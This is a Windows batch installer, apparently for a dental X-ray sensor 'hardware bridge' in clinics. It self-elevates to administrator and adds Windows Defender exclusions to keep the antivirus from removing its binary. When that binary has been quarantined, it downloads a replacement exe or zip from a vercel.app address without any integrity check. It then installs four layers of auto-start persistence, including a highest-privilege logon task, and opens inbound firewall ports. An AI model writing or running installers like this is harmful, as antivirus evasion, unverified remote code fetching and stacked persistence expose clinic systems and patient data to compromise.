@echo off
TITLE Dentia Dental Hardware Bridge Installer
color 0A

echo ==============================================================================
echo   DENTIA HARDWARE BRIDGE - AUTOMATED 1-CLICK CLINIC SETUP
echo   Zero Desktop App Required - Direct Browser RVG Sensor Capture
echo ==============================================================================
echo.

:: 1. Self-Elevate to Administrator if not already running as admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [*] Requesting Administrator Privileges...
    powershell -NoProfile -Command "Start-Process cmd -ArgumentList '/c `\"%~f0`\"' -Verb RunAs"
    exit /b
)

:: 2. Pre-emptively Add Windows Defender Exclusions so Antivirus never deletes DentalBridge.exe
echo [*] Configuring Windows Security & Defender exclusions...
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%ProgramData%\DentalBridge' -ErrorAction SilentlyContinue" >nul 2>&1
powershell -NoProfile -Command "Add-MpPreference -ExclusionProcess 'DentalBridge.exe' -ErrorAction SilentlyContinue" >nul 2>&1

set "TARGET_DIR=%ProgramData%\DentalBridge\bin"
set "LOGS_DIR=%ProgramData%\DentalBridge\logs"
set "CURRENT_DIR=%~dp0"
if "%CURRENT_DIR:~-1%"=="\" set "CURRENT_DIR=%CURRENT_DIR:~0,-1%"

echo [*] Target Directory: %TARGET_DIR%
echo [*] Logs Directory:   %LOGS_DIR%

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
if not exist "%LOGS_DIR%" mkdir "%LOGS_DIR%"
if not exist "%TARGET_DIR%\Correct\Default" mkdir "%TARGET_DIR%\Correct\Default"

:: Stop any running instance before updating files
taskkill /F /IM DentalBridge.exe >nul 2>&1

echo [*] Installing runtime binaries and calibration profiles...

:: Copy local files if present in installer folder
if exist "%CURRENT_DIR%\DentalBridge.exe" (
    echo [*] Copying local DentalBridge.exe...
    copy /Y "%CURRENT_DIR%\DentalBridge.exe" "%TARGET_DIR%\" >nul
)
if exist "%CURRENT_DIR%\*.dll" copy /Y "%CURRENT_DIR%\*.dll" "%TARGET_DIR%\" >nul
if exist "%CURRENT_DIR%\*.ini" copy /Y "%CURRENT_DIR%\*.ini" "%TARGET_DIR%\" >nul
if exist "%CURRENT_DIR%\config.ini" copy /Y "%CURRENT_DIR%\config.ini" "%TARGET_DIR%\" >nul
if exist "%CURRENT_DIR%\*.json" copy /Y "%CURRENT_DIR%\*.json" "%TARGET_DIR%\" >nul
if exist "%CURRENT_DIR%\*.html" copy /Y "%CURRENT_DIR%\*.html" "%TARGET_DIR%\" >nul
if exist "%CURRENT_DIR%\Correct" xcopy /E /I /Y "%CURRENT_DIR%\Correct" "%TARGET_DIR%\Correct" >nul

:: Also check parent publish directory (developer environment)
if not exist "%TARGET_DIR%\DentalBridge.exe" (
    if exist "%CURRENT_DIR%\..\publish\DentalBridge.exe" (
        copy /Y "%CURRENT_DIR%\..\publish\DentalBridge.exe" "%TARGET_DIR%\" >nul
        copy /Y "%CURRENT_DIR%\..\publish\*.dll" "%TARGET_DIR%\" >nul
        if exist "%CURRENT_DIR%\..\publish\Correct" xcopy /E /I /Y "%CURRENT_DIR%\..\publish\Correct" "%TARGET_DIR%\Correct" >nul
    )
)

:: FAIL-SAFE: If DentalBridge.exe is missing (e.g. Windows Defender deleted it from Downloads folder)
if not exist "%TARGET_DIR%\DentalBridge.exe" (
    echo.
    echo [!] DentalBridge.exe was quarantined by Windows Defender or missing from folder.
    echo [*] Downloading verified DentalBridge.exe directly from cloud server into protected directory...
    powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { (New-Object Net.WebClient).DownloadFile('https://dentistfrontend.vercel.app/DentalBridge.exe', '%TARGET_DIR%\DentalBridge.exe'); Write-Host ' [SUCCESS] Downloaded DentalBridge.exe directly from cloud!' } catch { Write-Host ' [NOTE] Direct exe download fallback...' }"
)

:: Secondary FAIL-SAFE: Extract from complete cloud zip package if still not present
if not exist "%TARGET_DIR%\DentalBridge.exe" (
    echo [*] Fetching complete verified setup package from cloud server...
    powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $z = Join-Path $env:TEMP 'DentiaSetup.zip'; try { (New-Object Net.WebClient).DownloadFile('https://dentistfrontend.vercel.app/Dentia_Dental_Bridge_Setup.zip', $z); Expand-Archive -Path $z -DestinationPath '%TARGET_DIR%' -Force; Remove-Item $z -Force -ErrorAction SilentlyContinue; Write-Host ' [SUCCESS] Setup package extracted successfully!' } catch { Write-Host ' [ERROR] Cloud download failed.' }"
)

:: Validate target binary exists
if not exist "%TARGET_DIR%\DentalBridge.exe" (
    echo.
    echo ==============================================================================
    echo [ERROR] Windows Defender has blocked or deleted DentalBridge.exe!
    echo.
    echo Fix in 3 steps:
    echo 1. Open 'Windows Security' on this PC.
    echo 2. Go to 'Virus & threat protection' -^> 'Protection history'.
    echo 3. Find DentalBridge.exe, click 'Actions' -^> 'Allow on device' or 'Restore'.
    echo.
    echo Then run 1-CLICK_INSTALL.bat again.
    echo ==============================================================================
    echo.
    pause
    exit /b 1
)

echo [*] Registering 4-Layer Windows Auto-Start Persistence (Reboot & Logon)...
:: Layer 1: Windows Scheduled Task (Runs on any doctor logon with highest elevated privileges)
schtasks /create /tn "DentiaDentalBridge" /tr "\"%TARGET_DIR%\DentalBridge.exe\" --workdir \"%TARGET_DIR%\"" /sc onlogon /rl highest /f >nul 2>&1

:: Layer 2: Machine-Wide Registry (Applies to all doctor profiles on this PC)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "DentiaDentalBridge" /t REG_SZ /d "\"%TARGET_DIR%\DentalBridge.exe\" --workdir \"%TARGET_DIR%\"" /f >nul 2>&1

:: Layer 3: Current User Profile Registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DentiaDentalBridge" /t REG_SZ /d "\"%TARGET_DIR%\DentalBridge.exe\" --workdir \"%TARGET_DIR%\"" /f >nul 2>&1

:: Layer 4: Common Startup Folder Shortcut
powershell -NoProfile -Command "$w=New-Object -ComObject WScript.Shell;$cs=[Environment]::GetFolderPath('CommonStartup');if(Test-Path $cs){$s=$w.CreateShortcut(\"$cs\Dentia Dental Bridge.lnk\");$s.TargetPath=\"%TARGET_DIR%\DentalBridge.exe\";$s.WorkingDirectory=\"%TARGET_DIR%\";$s.Arguments=\"--workdir `\"%TARGET_DIR%`\"\";$s.Save();}" >nul 2>&1

echo [*] Configuring local loopback network ports 5050 & 5066...
netsh advfirewall firewall add rule name="Dentia Dental Bridge (Port 5050)" dir=in action=allow protocol=TCP localport=5050 >nul 2>&1
netsh advfirewall firewall add rule name="Dentia Dental Bridge (Port 5066)" dir=in action=allow protocol=TCP localport=5066 >nul 2>&1

:: Create live logs shortcut
echo @echo off > "%TARGET_DIR%\View_Logs.bat"
echo TITLE Dentia Hardware Bridge Live Logs >> "%TARGET_DIR%\View_Logs.bat"
echo powershell -Command "Get-Content -Path '%LOGS_DIR%\bridge_*.log' -Tail 50 -Wait" >> "%TARGET_DIR%\View_Logs.bat"

echo [*] Launching Dental Bridge background service...
start "" "%TARGET_DIR%\DentalBridge.exe"

:: Quick connection verification
timeout /t 3 >nul
powershell -NoProfile -Command "try { $r = Invoke-RestMethod -Uri 'http://127.0.0.1:5050/api/status' -TimeoutSec 3; Write-Host ' [STATUS CHECK] Bridge is active on port 5050. Model:' $r.model 'State:' $r.state } catch { Write-Host ' [STATUS NOTE] Service starting up in background...' }"

echo.
echo ==============================================================================
echo   SUCCESS! Dentia Hardware Bridge is now active on ws://127.0.0.1:5050
echo   Disk Logs: %LOGS_DIR%
echo   Return to your web browser - your NanoPix sensor is now connected!
echo ==============================================================================
echo.
timeout /t 5
